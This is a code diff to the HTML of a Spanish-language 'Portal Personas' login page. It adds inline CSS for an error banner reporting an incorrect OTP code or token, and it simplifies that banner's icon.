@@ -7,7 +7,44 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="styles.css?v=6">
+    <style>
+        #otpTokenErrorAlert.otp-error-active,
+        #otpTokenErrorAlert:not([hidden]) {
+            display: block !important;
+            background-color: #fff5f5 !important;
+            border: 1px solid #f5c6cb !important;
+            border-radius: 4px !important;
+            margin-bottom: 20px !important;
+            box-sizing: border-box !important;
+        }
+        #otpTokenErrorAlert .alert-body {
+            display: flex !important;
+            align-items: flex-start !important;
+            gap: 12px !important;
+            padding: 16px !important;
+        }
+        #otpTokenErrorAlert .alert-icon {
+            flex-shrink: 0 !important;
+            width: 24px !important;
+            height: 24px !important;
+            border-radius: 50% !important;
+            background-color: #dc3545 !important;
+            color: #fff !important;
+            font-size: 15px !important;
+            font-weight: 700 !important;
+            line-height: 24px !important;
+            text-align: center !important;
+        }
+        #otpTokenErrorAlert .alert-heading {
+            display: block !important;
+            color: #c62828 !important;
+            font-size: 13px !important;
+            font-weight: 700 !important;
+            line-height: 1.45 !important;
+            text-transform: uppercase !important;
+        }
+    </style>
 </head>
 <body>
     <!-- Loading Overlay -->
@@ -30,14 +67,9 @@
                 
                 <h1 class="title">Bienvenido al<br>Portal Personas</h1>
 
-                <div id="otpTokenErrorAlert" data-role="login-template__alert" class="alert alert-danger caja-alert-error" role="alert" hidden>
+                <div id="otpTokenErrorAlert" data-role="login-template__alert" class="alert alert-danger" role="alert" hidden style="display:none">
                     <div class="alert-body">
-                        <div class="alert-icon">
-                            <svg class="bb-icon bb-icon--md bb-icon-error-outline" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
-                                <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2"/>
-                                <path d="M12 8v5M12 16h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-                            </svg>
-                        </div>
+                        <div class="alert-icon" aria-hidden="true">!</div>
                         <div class="alert-content">
                             <strong role="heading" class="alert-heading">CODIGO OTP INGRESADO INCORRECTO O TOKEN INGRESADO INCORRECTO</strong>
                         </div>
